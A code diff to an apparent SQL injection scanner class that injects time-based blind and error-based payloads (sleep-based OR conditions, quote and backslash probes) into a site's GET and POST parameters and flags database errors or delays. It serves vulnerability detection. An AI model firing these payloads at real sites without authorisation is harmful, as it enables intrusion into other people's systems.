@@ -1,4 +1,5 @@
 import urllib.parse as urlparse
+from copy import deepcopy
 from datetime import datetime
 from typing import List
 
@@ -12,7 +13,7 @@ from Models.SqliFoundDTO import SqliFoundDTO, SqliType
 class SqliManager:
     def __init__(self, domain, cookies, headers):
         self._domain = domain
-        self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C']
+        # self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C']
         self._time_based_payloads = [
             {'TruePld': '1\'OR(if(1=1,sleep(5),0))OR\'2', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))OR\'2'},
             {'TruePld': '1\'OR(if(1=1,sleep(5),0))--%20', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))--%20'},
@@ -20,7 +21,7 @@ class SqliManager:
         ]
         self._delay_in_seconds = 5
         self._request_handler = RequestHandler(cookies, headers)
-        self._injections_to_check = ['syntax', 'xpath', 'internalerror', 'warning: ', 'Server Error in']
+        self._injections_to_check = ['syntax', 'xpath', 'internalerror', 'warning: ', 'exception: ']
         self._single_error_based_payload = '\'"%5C)\\\\'
 
     def check_get_requests(self, dtos: List[GetRequestDTO]):
@@ -57,18 +58,20 @@ class SqliManager:
         for form in dto.form_params:
             if form.method_type == "POST":
                 for param in form.params:
-                    copy_form_params = form.params
-                    old_param = copy_form_params[param]
+                    copy_form_params = deepcopy(form.params)
                     copy_form_params[param] = self._single_error_based_payload
 
                     response = self._request_handler.handle_request(dto.url, post_data=copy_form_params)
                     if response is None:
                         continue
 
-                    self.__check_keywords(result, response, dto.url, SqliType.FORM_ERROR, params=copy_form_params)
+                    self.__check_keywords(result,
+                                          response,
+                                          dto.url,
+                                          SqliType.FORM_ERROR,
+                                          post_payload=copy_form_params,
+                                          original_post_params=form.params)
 
-                    if response.status_code == 400:
-                        copy_form_params[param] = old_param
             elif form.method_type == "GET":
                 parsed = urlparse.urlparse(dto.url)
                 url_ending = len(form.action) * -1
@@ -80,11 +83,15 @@ class SqliManager:
                     prev_url = url
                     url += f'{param}={self._single_error_based_payload}&'
 
-                    response = self._request_handler.handle_request(dto.url)
+                    response = self._request_handler.handle_request(url)
                     if response is None:
                         continue
 
-                    self.__check_keywords(result, response, dto.url, SqliType.FORM_GET_ERROR, params=param)
+                    self.__check_keywords(result,
+                                          response,
+                                          url,
+                                          SqliType.FORM_GET_ERROR,
+                                          original_url=dto.url)
 
                     if response.status_code == 400:
                         url = prev_url
@@ -138,7 +145,7 @@ class SqliManager:
             if response is None:
                 return
 
-            self.__check_keywords(result, response, url, SqliType.ERROR)
+            self.__check_keywords(result, response, url, SqliType.ERROR, original_url=dto.url)
 
         except Exception as inst:
             print(f"Exception - ({url}) - {inst}")
@@ -153,24 +160,35 @@ class SqliManager:
                     print(f"SQLiManager delay FOUND: - {true_payload} - {false_payload}")
                     return result.append(SqliFoundDTO(SqliType.TIME, true_payload, 'TIME_BASED', response1.text))
 
-    def __check_keywords(self, result, response, url, sqli_type: SqliType, params=None):
-        web_page = response.text
+    def __check_keywords(self, result, response, url_payload, sqli_type: SqliType,
+                         post_payload=None,
+                         original_url: str = None,
+                         original_post_params=None):
+        web_page = response.text.lower()
         for keyword in self._injections_to_check:
-            # if keyword in web_page and dto.response_length != len(response.text):
             if keyword in web_page:
+
+                if original_url is not None:
+                    check_response = self._request_handler.handle_request(original_url)
+                else:
+                    check_response = self._request_handler.handle_request(url_payload, post_data=original_post_params)
+
+                if keyword in check_response.text.lower():
+                    return
+
                 substr_index = web_page.find(keyword)
                 start_index = substr_index - 50 if substr_index - 50 > 0 else 0
                 last_index = substr_index + 50 if substr_index + 50 < len(web_page) else substr_index
-                log_header_msg = f'injFOUND "{keyword}":' \
-                                 f'STATUS-{response.status_code};' \
-                                 f'DETAILS-{web_page[start_index:last_index]};'
+                log_header_msg = f'injFOUND: {keyword};' \
+                                 f'STATUS: {response.status_code};' \
+                                 f'DETAILS: {web_page[start_index:last_index]};'
                 curr_resp_length = len(web_page)
                 if len(result) == 0 or \
                         len(list(filter(lambda dto: dto.response_length == curr_resp_length, result))) < 5:
                     print(log_header_msg)
-                    result.append(SqliFoundDTO(sqli_type, url, params, web_page, log_header_msg))
+                    result.append(SqliFoundDTO(sqli_type, url_payload, post_payload, web_page, log_header_msg))
                 else:
-                    print("Duplicate FORM SQLi: - " + url)
+                    print("Duplicate FORM SQLi: - " + url_payload)
 
             if str(response.status_code)[0] == '5':
-                print("SqliManager: 500 status - " + url)
+                print("SqliManager: 500 status - " + url_payload)
